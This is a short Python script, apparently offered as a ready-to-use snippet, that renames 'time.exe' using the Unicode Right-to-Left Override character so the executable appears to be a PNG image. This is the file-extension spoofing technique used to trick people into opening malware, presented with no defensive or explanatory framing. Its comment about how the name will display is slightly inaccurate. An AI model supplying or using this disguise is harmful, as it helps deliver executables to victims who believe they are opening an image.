import os

# Right-to-Left Override Unicode character
rlo = "\u202e"

# Original file name
original_filename = "time.exe"

# Target deceptive filename
deceptive_filename = f"time{rlo}gnp.exe"  # This will appear as ".exe.png"

# Renaming the file
os.rename(original_filename, deceptive_filename)

print(f"File renamed to: {deceptive_filename}")
